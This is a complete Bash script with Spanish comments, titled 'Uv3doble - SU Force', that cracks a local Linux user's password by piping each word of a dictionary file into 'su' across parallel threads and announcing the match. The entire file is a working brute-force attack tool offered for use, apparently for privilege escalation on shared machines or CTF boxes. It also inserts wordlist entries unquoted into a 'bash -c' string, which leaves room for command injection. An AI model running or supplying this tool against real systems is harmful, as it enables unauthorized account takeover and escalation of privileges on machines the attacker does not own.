#!/usr/bin/env bash

# ==========================================
#      Uv3doble - SU Force (v1.7)
#      by Uv3doble
# ==========================================

# Colores
BLUE="\e[1;34m"
YELLOW="\e[1;33m"
GREEN="\e[1;32m"
RED="\e[1;31m"
NC="\e[0m"

print_banner() {
    clear
    printf "${BLUE}"
    printf "╔═══════════════════════════════════════╗\n"
    printf "║         Uv3doble - SU Force           ║\n"
    printf "╚═══════════════════════════════════════╝\n"
    printf "${YELLOW}              by Uv3doble${NC}\n\n"
}

usage() {
    echo -e "${YELLOW}Uso:${NC} $0 USUARIO DICCIONARIO.txt [HILOS]"
    echo -e "Ejemplo: $0 redghost rockyou.txt 8"
    exit 1
}

# PID padre y temp file para comunicar éxito
PARENT_PID=$$
TMPFILE="/tmp/su_force_found_$$"

# Limpia jobs y archivos temporales
cleanup() {
    jobs -p | xargs --no-run-if-empty kill 2>/dev/null
    [[ -f "$TMPFILE" ]] && rm -f "$TMPFILE"
}

# Al SIGINT: limpia y sale
trap 'cleanup; echo -e "\n${RED}[!] Interrumpido por el usuario.${NC}"; exit 1' SIGINT

# Al señal de éxito: lee antes, luego limpia y sale
on_success() {
    # Leer la contraseña exitosa
    if [[ -f "$TMPFILE" ]]; then
        PASSWORD=$(< "$TMPFILE")
    else
        PASSWORD="(desconocida)"
    fi
    # Ahora sí limpiamos
    cleanup
    # Mostrar resultado
    printf "\n${GREEN}╔════════════════════════════════╗\n"
    printf "║       RESULTADO DEL ATAQUE     ║\n"
    printf "╠════════════════════════════════╣\n"
    printf "║ Usuario    : %s\n" "$usuario"
    printf "║ Diccionario: %s\n" "$diccionario"
    printf "║ Contraseña : %s\n" "$PASSWORD"
    printf "╚════════════════════════════════╝${NC}\n\n"
    exit 0
}
trap 'on_success' SIGUSR1

# Spinner para mostrar actividad
spinner() {
    local delay=0.1
    local spinstr='|/-\'
    while true; do
        for c in $spinstr; do
            printf "\r${BLUE}[*] Ataque en curso... %s ${NC}" "$c"
            sleep "$delay"
        done
    done
}

# --- Validación de argumentos ---
if [[ $# -lt 2 ]]; then
    usage
fi

usuario="$1"
diccionario="$2"
threads="${3:-4}"

# Validar diccionario
[[ "${diccionario##*.}" != "txt" ]] && echo -e "${RED}Error:${NC} El diccionario debe tener extensión .txt." && usage
[[ ! -r "$diccionario" ]] && echo -e "${RED}Error:${NC} No se puede leer '$diccionario'." && exit 1

print_banner
echo -e "${GREEN}[*] Iniciando ataque a '${usuario}' con '${diccionario}' en ${threads} hilos...${NC}"

# Función que prueba una sola contraseña
try_pass() {
    local pw="$1"
    if timeout 0.05 bash -c "echo \"$pw\" | su $usuario -c 'exit'" &>/dev/null; then
        echo "$pw" > "$TMPFILE"
        kill -SIGUSR1 "$PARENT_PID"
    fi
}

export -f try_pass
export usuario diccionario TMPFILE PARENT_PID

# Iniciar spinner en background
spinner &
SPINNER_PID=$!

# Ejecutar fuerza bruta con paralelismo
xargs -a "$diccionario" -P "$threads" -I{} bash -c 'try_pass "$@"' _ {} &

# Esperar a que finalicen (o recibamos SIGUSR1)
wait

# Si llegamos aquí sin éxito
cleanup
echo -e "\n${RED}[-] Ataque completado: Contraseña NO encontrada tras leer todo el diccionario.${NC}"
exit 1
